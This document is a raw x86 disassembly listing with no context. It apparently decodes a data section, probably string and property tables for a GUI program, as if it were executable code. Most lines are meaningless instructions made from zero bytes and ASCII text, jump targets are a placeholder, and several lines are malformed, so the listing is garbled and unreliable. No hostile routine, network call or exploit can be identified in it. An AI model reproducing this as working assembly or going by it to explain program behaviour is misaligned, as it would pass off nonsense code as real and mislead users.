add [ esp + eax * 4 + 0x44 ] cl
add [ eax + 0x6b ] ch
inc esp
add [ eax ] ah
insb
inc esp
add [ eax + 0x1c00446b ] dh
push 0x44
add [ eax - 0x4fffbb96 ] dl
push 0x44
add al ch
imul eax [ eax + eax + 0x3c ] 0x6e
inc esp
add [ eax + 0x6d ] ch
inc esp
add [ esp + ebp * 2 + 0x44 ] cl
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 + 0x44 ] al
add al ah
push 0x44
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add ah ch
dec ebp
inc esp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ esi + eax * 2 ] ah
inc esp
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add ah cl
insb
inc esp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + ecx * 2 ] cl
inc esp
add [ esi + ecx * 8 + 0x45 ] dl
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
dec eax
xor al 0x40
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
mov eax eax
0xf070043 0x4354
rcl [ ebp + eax * 2 + 0x444aec00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah dl
dec esp
inc esp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ ebx + eax * 4 + 0x5a140044 ] ah
inc esp
add [ edx * 2 + 0x6b000044 ] dh
inc esp
add ah ch
add [ eax + eax + 0x4c ] 0xffffff82
inc esp
add [ eax - 0x3ffbb7e ] cl
add [ eax + eax + 0x24 ] 0x13
inc esi
add [ eax - 0x27ffbb7d ] dh
pop esp
inc esp
add [ ebp + edx * 2 + 0x44 ] bh
add [ ebx + ebx * 2 ] cl
inc esp
add [ eax + 0x5b ] cl
inc esp
add [ esp + edi * 2 ] al
inc esp
add [ esp + edi * 2 + 0x44 ] bl
add ah cl
jl r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add al ch
insb
inc esp
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
imul eax [ eax ] 0x8
inc ebx
outsd
insd
inc ebx
je r-xdata
add ah al
add [ eax + eax + 0x44 ] 0x7d
inc esp
add [ edx + ebx * 2 ] bh
inc esp
add [ edx + ebx * 2 + 0x44 ] ah
add [ eax - 0x27ffbba6 ] dh
pop edx
inc esp
add ah bh
jpe r-xdata
add [ esi + ecx * 2 ] bh
insb
jae r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
push cs
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
add [ eax + 0x59 ] al
inc esp
add [ ecx ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
mov eax eax
adc al 0xec
inc ebx
add [ edi ] al
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
add [ gs : eax ] eax
inc esp
rol [ ebp ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
sub al 0x17
inc ebp
add [ edx + 0x1 ] ah
add bh bh
xchg esp eax
rol [ ebp ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
str [ edx ]
inc edx
jbe r-xdata
outsd
arpl [ edx + 0x79 ] ax
or al 0x8
inc ebp
add [ ecx ] ah
add bh bh
mov al [ 0x3c00454d ]
add al bh
jbe r-xdata
insb
pop es
inc ecx
insb
push esi
imul esp [ ebp + 0x77 ] r-xdata
pushad
0x6b0043 0x4308
adc eax 0x6f420b00
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0xe4ff0001
rol [ ebp ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
add [ edx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
insb
inc ebp
jae r-xdata
push ebp
add [ eax + 0x2 ] ch
add bh bh
clc
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
fadd [ eax ]
inc ebp
add [ ebx ] bl
add bh bh
pushad
dec edi
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
add eax 0x67696c41
outsb
push esp
adc [ eax ] al
push 0xf8ff0002
add [ eax + eax ] bh
add dh bh
ror [ ebp + 0x45 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc ecx
add [ eax - 0xfffffb ] al
sbb [ eax ] al
jb r-xdata
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
push edi
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6c410700
push ss
inc ebp
add [ ebx + 0x1 ] ah
add bh bh
push eax
rol [ ebp ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
or al [ ebx + 0x68 ]
arpl [ gs : ebx + 0x62 ] bp
xlat
inc ebx
add [ edx + eax ] bh
add bh bh
xor [ eax + 0x44 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
jo r-xdata
je r-xdata
outsd
insb
jne r-xdata
sbb [ eax ] eax
pop es
inc ebx
jb r-xdata
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc eax [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
insb
dec ecx
outsb
outsb
jb r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
je r-xdata
jae r-xdata
inc esp
rol [ eax ] 0x45
outsb
jae r-xdata
add eax 0x6f6c6f43
jb r-xdata
add bh bh
in al dx
pop ebx
inc ebp
add [ eax ] cl
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ 0x18ff0000 ] 0x0
add [ eax ] eax
insb
test [ gs : esi ] dl
inc ebp
add [ ecx + eax ] ch
jmp [ eax + 0x10045c4 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
dec esi
push ss
inc ebp
add [ ecx + eax ] ah
call [ eax - 0x30 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add bh bh
and [ edi + 0x45 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
outsd
outsb
jae r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax 0x72440a00
popad
inc ebx
jne r-xdata
adc [ eax ] al
sub al [ edx ]
add bh bh
and [ ebp + 0x44 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or eax [ ebx + 0x6f ]
insb
jne r-xdata
outsd
js r-xdata
rcl [ ebx + 0x44 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ edx ] cl
inc ebx
push 0x626b6365
add bh bh
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
scasd [ edi ]
inc esi
add [ edx + eax ] dl
insb
dec edi
jne r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
inc [ eax + 0x5b ]
jae r-xdata
jb r-xdata
outsb
inc ebx
add bh bh
or al 0x55
jb r-xdata
inc esi
insb
popad
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
push ds
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3f00ffff ] ah
les eax [ ebp ]
in al 0xc4
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
je r-xdata
adc [ eax ] al
jne r-xdata
inc ebp
add [ eax + 0x5b ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040021 ] al
add bh bh
inc eax
jb r-xdata
pop ebx
outsd
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jo r-xdata
pop ss
inc ebp
add [ ebp + 0x1 ] ah
add bh bh
add [ eax ] bh
add al [ eax ]
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
outsd
outsb
je r-xdata
and [ ecx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ eax + eax * 8 ]
inc ebp
in al 0x54
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
push cs
add bh bh
add [ eax ] ah
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
cmp [ esi ] ch
inc edx
add [ eax ] ch
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
js r-xdata
add [ eax ] dl
inc eax
add [ esi + 0x2 ] dh
add bh bh
clc
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
push esp
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
add [ eax ] al
add [ es : eax ] cl
dec eax
outsd
je r-xdata
add [ eax ] al
add [ bx + si ] dl
inc eax
add [ edi + 0x2 ] dh
add bh bh
inc eax
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0x0
or [ edi + 0x72 ] eax
imul esp [ esp + ecx * 2 + 0x69 ] 0x73656e
adc [ eax ] al
cmp [ edx ] al
add bh bh
in al dx
pop eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x69480d00
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + 0x2 ] bh
add [ edx + eax ] dh
add bh bh
adc al 0x59
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490b0029 ] al
arpl [ edi + 0x6e ] bp
jb r-xdata
inc esp
add al [ eax ]
imul ebp [ edi + 0x6e ] 0x43d8f873
add [ edx + eax ] ch
dec edi
jo r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or ecx [ ecx + 0x63 ]
outsd
outsb
arpl [ ebx - 0x44 ] bp
fld [ ebx ]
jns r-xdata
popad
popad
je r-xdata
outsb
jb r-xdata
add [ 0x774f0900 ] ch
insd
jae r-xdata
push 0x1004454
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ esi ] cl
dec eax
outsd
je r-xdata
add bh bh
adc [ eax ] al
jpe r-xdata
or [ edx + 0x6f ] edx
ja r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x2 ] al
add bh bh
mov esp 0x1004454
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c0b002b ] al
popad
jb r-xdata
sub [ esi ] eax
sbb [ edx ] al
add bh bh
clc
jo r-xdata
add bh bh
and al 0x70
inc esp
clc
fadd [ ebx ]
sub al 0x2
jb r-xdata
rcl [ esp + eax * 2 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
add bh bh
jb r-xdata
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] eax
push cs
inc edx
jb r-xdata
add [ eax ] al
add [ cs : ecx ] cl
dec edi
ja r-xdata
dec ecx
call [ eax + 0x1004454 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax 0x774f0900
add [ edx + eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905002a ] al
je r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
adc [ eax ] al
pop ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6f500900
outsb
je r-xdata
push ebx
jb r-xdata
adc [ eax ] al
sub [ edx ] al
add bh bh
hlt
insd
popad
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ ecx + 0x72 ]
dec ecx
insb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
aaa
add [ 0x776f6853 ] cl
push edi
outsb
je r-xdata
add [ eax ] al
add [ ebx ] dh
add [ edx ] cl
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax ]
pop esp
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
push 0x6948776f
outsb
je r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
push eax
popad
jb r-xdata
add [ esi ] cl
ja r-xdata
add [ ecx + eax * 4 ] bl
inc esp
adc [ eax ] al
or [ ecx - 0x7f1bffbc ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
jb r-xdata
inc ecx
jb r-xdata
jb r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530b0039 ] al
insd
sub [ esi ] eax
sbb al 0x2
ja r-xdata
outsb
jne r-xdata
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push ss
add al [ eax ]
inc [ eax ]
pop ecx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
das
add [ eax ] cl
push edx
popad
add al [ eax ]
[ eax ]
push esp
jns r-xdata
or [ ebx + 0x6f ] dl
popad
jae r-xdata
inc ebx
add [ ecx ] ch
add al [ eax ]
push [ eax + 0x70 ]
add [ eax ] dl
inc eax
add [ edx + eax + 0x7f90ff00 ] dl
inc esp
jo r-xdata
dec edi
inc esi
add [ eax + eax ] bh
inc [ edx + ebx * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090035 ] al
outsd
popad
insb
insb
dec ecx
insd
popad
jae r-xdata
or edx [ ebx + 0x6d ]
outsb
dec eax
popad
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
[ eax + 0x71 ]

add bh bh
jo r-xdata
outsd
jb r-xdata
add [ ss : ecx ] dl
push ebx
push 0x6f43776f
insb
jne r-xdata
adc [ eax ] al
sub eax [ edx ]
add bh bh
nop
push ebp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x28ff0002
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ gs : ecx ] ch
inc esi
add [ eax ] ah
add al [ eax ]
jmp eax
adc [ eax ] al
cdq
add [ eax ] al
[ ebx + ebx * 2 + 0x5b640045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080038 ] al
xor al 0x0
adc [ eax ] al
0xc0ff0000 0x455b
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
cmp eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f180041 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
aas
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x48656c62
je r-xdata
fild [ ebx ]
add [ eax ] cl
dec edi
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
outsb
inc ecx
jbe r-xdata
add [ ecx ] 0x18
add [ eax - 0x5700fffe ] ch
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f140040 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] al
add [ ecx ] cl
push esi
imul esp [ ebp + 0x77 ] 0x6c797453
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
outsb
inc ebx
push 0x69676e61
outsb
je r-xdata
popad
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
or [ esi + 0x69 ] edx
ja r-xdata
dec ecx
insd
popad
jae r-xdata
add [ eax ] al
insd
inc esp
jb r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
add [ 0x6f436e4f ] cl
insb
jne r-xdata
je r-xdata
outsb
inc ebx
push 0x65676e61
sbb al 0xdf
inc ebx
add al al
add al [ eax ]
je r-xdata
popad
je r-xdata
add bh bh
push 0x1004471
add [ eax ] al
add [ eax ] al
adc [ ecx ] ch
inc esi
add [ edx + eax ] bl
pop es
inc ebp
add [ eax * 8 - 0x3a63ffbb ] bl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add al cl
add al [ eax ]
dec eax
add al [ eax ]
ja r-xdata
add [ eax ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ edi ] cl
dec edi
outsb
inc ebx
outsd
insb
jne r-xdata
dec edi
insd
inc esp
jb r-xdata
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
fiadd [ ebx ]
rol [ edx ] 0x0
insd
inc esp
jb r-xdata
jecxz r-xdata
dec eax
jecxz r-xdata
jne r-xdata
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
insb
pop ecx
inc ebp
add al cl
jpe r-xdata
insb
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10004c ] al
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0e004a ] al
outsb
inc esp
jb r-xdata
outsb
add [ eax ] al
add [ eax ] 0x0
ja r-xdata
popad
ja r-xdata
add [ eax ] 0x0
add [ eax + 0x4f1b0042 ] al
outsb
inc ecx
jbe r-xdata
inc [ ecx ]
insd
js r-xdata
add [ edx ] cl
je r-xdata
outsb
inc ebx
jne r-xdata
add [ eax ] al
or [ eax + eax + 0x10 ] 0x4f
outsb
inc ebx
outsd
outsb
je r-xdata
cwde
adc [ ebp ] al
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebp
add [ ebx ] dl
js r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ esi ] cl
dec edi
fcomp st7
inc ebx
add al ah
add al [ eax ]
jmp eax
add [ eax ] eax
jmp [ eax ]
jne r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
call sub_443a25
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
dec edi
add [ eax ] bl
inc ebx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edx
add [ edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
sub [ ebx ] al
add bh bh
sub [ ebx ] al
add bh bh
inc esi
imul ebp [ esi + 0x64 ] r-xdata
sbb [ ebx ] al
add bh bh
sbb [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
or [ edi ] 0xa
insd
inc esp
jb r-xdata
je r-xdata
je r-xdata
inc ebx
jne r-xdata
push eax
outsd
jo r-xdata
add [ eax + 0x4f070045 ] al
dec ecx
je r-xdata
imul esi [ ecx + ebp * 2 + 0x6e ] 0x450c0467
outsd
outsb
push eax
loope r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebx
add [ edx ] cl
dec edi
outsb
inc esp
insb
je r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
and [ ebx ] al
add bh bh
and [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ecx
add [ ecx ] dl
outsb
inc esp
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004f ] al
ja r-xdata
inc esp
insd
inc esp
jb r-xdata
jo r-xdata
insd
inc edi
je r-xdata
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090057 ] al
sbb al 0xde
inc ebx
add [ eax + 0x3 ] al
add bh bh
inc eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090056 ] al
outsb
inc ebp
imul esi [ fs : ecx + ebp * 2 + 0x6e ] 0x450c0467
add [ eax ] dh
outsb
inc esp
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esp
add [ edx ] cl
dec edi
push ebx
je r-xdata
dec esi
add [ esi ] al
dec edi
je r-xdata
outsb
add [ eax ] 0x0
add [ eax + 0x4f0a0050 ] al
ja r-xdata
add [ eax - 0x80000000 ] al
dec ecx
add [ ecx ] cl
dec edi
outsb
inc ebx
outsd
insd
jo r-xdata
loope r-xdata
add [ eax ] al
insd
popad
dec ecx
outsb
js r-xdata
outsb
add [ eax ] al
adc [ edi ] 0x9
dec edi
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0054 ] al
je r-xdata
dec edi
outsb
inc esp
popad
je r-xdata
adc [ ecx ] 0x11
jl r-xdata
add [ eax ] al
insd
[ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne r-xdata
jae r-xdata
add al dh
add al [ eax ]
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c004b ] al
outsb
inc ebx
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x4f080060 ] al
outsb
dec ecx
outsb
jae r-xdata
inc esp
jb r-xdata
add [ eax ] al
out 0x43 eax
add [ eax + 0x3 ] dl
add bh bh
push eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f11005c ] al
outsb
inc edi
je r-xdata
add al 0xc
inc ebp
je r-xdata
add [ eax ] al
adc [ eax + eax + 0xa ] 0x4f
inc ebx
push 0x65676e61
or [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ eax ] dl
add eax [ eax ]
call [ eax ]
add eax [ eax ]
inc [ ecx ]
outsb
add [ eax ] al
add eax [ eax ]
inc [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13004d ] al
push eax
add [ edx ] cl
dec edi
dec ecx
je r-xdata
outsd
outsb
inc esp
popad
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f06004e ] al
je r-xdata
pop es
dec edi
jb r-xdata
inc ebp
add al bl
add [ eax ] eax
jo r-xdata
add [ eax ] al
and [ ecx ] 0x9
dec edi
jbe r-xdata
jb r-xdata
jne r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
or al 0x45
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090058 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
insd
je r-xdata
popad
insd
cmp ch ah
inc ebx
add [ eax ] cl
add eax [ eax ]
add [ eax ] al
insd
inc esp
jb r-xdata
loopne r-xdata
jo r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0064 ] al
dec edi
outsb
dec esp
or al [ ebp ]
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
add [ ecx ] cl
add [ eax + 0x4f0a005d ] al
outsb
inc esp
jb r-xdata
insd
dec ecx
insd
popad
pop esp
or eax [ ebp ]
call 0xffffffffe942f83f
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005e ] al
outsb
inc esp
jb r-xdata
or al [ ebp ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
jb r-xdata
outsd
out 0x43 eax
add [ eax + 0x3 ] bl
add bh bh
pop eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09005f ] al
dec ecx
je r-xdata
add eax [ eax ]
push [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
inc ebx
add [ eax ] bh
add eax [ eax ]
dec [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
ja r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
